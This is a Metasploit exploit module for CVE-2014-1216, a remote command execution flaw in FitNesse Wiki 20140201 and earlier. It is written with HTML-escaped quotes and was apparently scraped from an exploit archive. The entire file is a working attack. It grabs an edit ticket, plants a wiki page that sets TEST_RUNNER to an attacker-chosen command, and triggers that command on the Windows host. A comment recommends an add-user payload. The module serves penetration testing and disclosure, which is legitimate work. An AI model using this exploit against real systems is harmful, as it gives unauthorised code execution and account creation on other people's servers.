# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Fitnesse Wiki Remote Command Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability found in Fitnesse Wiki, version 20140201
        and earlier.
      },
      &#039;Author&#039;         =>
        [
          &#039;Jerzy Kramarz&#039;,  ## Vulnerability discovery
          &#039;Veerendra G.G <veerendragg {at} secpod.com>&#039;, ## Metasploit Module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2014-1216&#039; ],
          [ &#039;OSVDB&#039;, &#039;103907&#039; ],
          [ &#039;BID&#039;, &#039;65921&#039; ],
          [ &#039;URL&#039;, &#039;http://secpod.org/blog/?p=2311&#039; ],
          [ &#039;URL&#039;, &#039;http://secpod.org/msf/fitnesse_wiki_rce.rb&#039; ],
          [ &#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2014/Mar/1&#039; ],
          [ &#039;URL&#039;, &#039;https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-1216/&#039; ]
        ],
 
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 1000,
          &#039;BadChars&#039; => "",
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;, ##
              ##&#039;RequiredCmd&#039;  => &#039;generic telnet&#039;,
              ## payloads cmd/windows/adduser and cmd/windows/generic works perfectly
            }
        },
      &#039;Platform&#039;       => %w{ win },
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        =>
        [
          [&#039;Windows&#039;, { &#039;Platform&#039; => &#039;win&#039; } ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Feb 25 2014&#039;))
 
    register_options(
      [
        Opt::RPORT(80),
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;Fitnesse Wiki base path&#039;, &#039;/&#039;])
      ], self.class)
  end
 
  def check
    print_status("#{peer} - Trying to detect Fitnesse Wiki")
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path)
    })
 
    if res && res.code == 200 && res.body.include?(">FitNesse<")
      print_good("#{peer} - FitNesse Wiki Detected!")
      return Exploit::CheckCode::Detected
    end
 
    return Exploit::CheckCode::Safe
  end
 
  def http_send_command(command)
 
    ## Construct random page in WikiWord format
    uri = normalize_uri(target_uri.path, &#039;TestP&#039; + rand_text_alpha_lower(7))
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => uri + "?edit"
    })
 
    if !res || res.code != 200
      fail_with(Failure::Unknown, "#{peer} - Unexpected response, exploit probably failed!")
    end
 
    print_status("#{peer} - Retrieving edit time and ticket id")
 
    ## Get Edit Time and Ticket Id from the response
    res.body =~ /"editTime" value="((\d)+)"/
    edit_time = $1
 
    res.body =~ /"ticketId" value="((-?\d)+)"/
    ticket_id = $1
 
    ## Validate we are able to extract Edit Time and Ticket Id
    if !edit_time or !ticket_id
      print_error("#{peer} - Failed to get Ticket Id / Edit Time.")
      return
    end
 
    print_status("#{peer} - Attempting to create &#039;#{uri}&#039;")
 
    ## Construct Referer
    referer = "http://#{rhost}:#{rport}" + uri + "?edit"
 
    ## Construct command to be executed
    page_content = &#039;!define COMMAND_PATTERN {%m}
!define TEST_RUNNER {&#039; + command + &#039;}&#039;
 
    print_status("#{peer} - Injecting the payload")
    ## Construct POST request to create page with malicious commands
    ## inserted in the page
    res = send_request_cgi(
    {
      &#039;uri&#039;     => uri,
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;headers&#039; => {&#039;Referer&#039; => referer},
      &#039;vars_post&#039; =>
        {
          &#039;editTime&#039; => edit_time,
          &#039;ticketId&#039; => ticket_id,
          &#039;responder&#039; => &#039;saveData&#039;,
          &#039;helpText&#039; => &#039;&#039;,
          &#039;suites&#039; => &#039;&#039;,
          &#039;__EDITOR__1&#039; => &#039;textarea&#039;,
          &#039;pageContent&#039; => page_content,
          &#039;save&#039; => &#039;Save&#039;,
        }
    })
 
    if res && res.code == 303
      print_status("#{peer} - Successfully created &#039;#{uri}&#039; with payload")
    end
 
    ## Execute inserted command
    print_status("#{peer} - Sending exploit request")
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => uri + "?test"
    })
 
    if res && res.code == 200
      print_status("#{peer} - Successfully sent exploit request")
    end
 
    ## Cleanup by deleting the created page
    print_status("#{peer} - Execting cleanup routine")
    referer = "http://#{rhost}:#{rport}" + uri + "?deletePage"
    res = send_request_cgi(
    {
      &#039;uri&#039;     => uri + "?deletePage",
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;headers&#039; => {&#039;Referer&#039; => referer},
      &#039;vars_post&#039; =>
        {
          &#039;confirmed&#039; => &#039;Yes&#039;,
        }
    })
  end
 
  def exploit
    http_send_command(payload.encoded)
  end
end

